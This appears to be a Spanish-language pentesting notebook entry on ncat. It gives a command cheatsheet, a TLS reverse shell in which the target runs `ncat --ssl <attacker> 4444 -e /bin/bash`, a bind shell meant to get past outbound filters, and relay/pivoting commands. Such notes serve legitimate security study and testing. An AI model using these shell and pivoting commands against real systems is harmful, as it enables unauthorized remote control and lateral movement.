---
aliases:
tags:
  - estado/completo
  - tool/ncat
kind: Tool
linked:
  - "[[nc]]"
  - "[[Reverse Shell]]"
---
# ncat

> [!info]
> Nmap's modern netcat. SSL/TLS nativo, proxy, IPv6, broker mode, allow/deny lists. Reemplazo directo de `nc` con features añadidas.

***

## Cheatsheet

| Comando | Qué obtenés | Cuándo |
|---|---|---|
| `ncat -lvnp 4444` | Listener TCP | Estándar |
| `ncat --ssl -lvnp 4444` | Listener con TLS | Shell sobre TLS |
| `ncat --ssl <target> <port>` | Conectar TLS | Servicio SSL/STARTTLS |
| `ncat -lvnp 4444 -e /bin/bash` | Bind shell | Bypass de filtros que bloquean conn out |
| `ncat -lvnp 4444 --allow <ip>` | Listener con whitelist | Limitar exposure |
| `ncat --proxy <ip>:<port> --proxy-type http <target> <port>` | Conectar via HTTP proxy | Pivoting |
| `ncat --broker -lvnp 4444` | Broker mode | Chat multi-client / relay |
| `ncat -u -lvnp 4444` | UDP listener | UDP exfil/recv |

***

## TLS reverse shell

```bash
# Attacker
openssl req -new -x509 -keyout key.pem -out cert.pem -days 365 -nodes
ncat --ssl -lvnp 4444 --ssl-cert cert.pem --ssl-key key.pem

# Target
ncat --ssl <attacker> 4444 -e /bin/bash
```

***

## Relay / pivoting

```bash
# Forward localhost:8080 → remote target:80
ncat -lvnp 8080 -c "ncat <target> 80"
```

***

## Notas Relacionadas

- [[nc]]
- [[Reverse Shell]]
- [[Pivoting & Port Forwarding]]
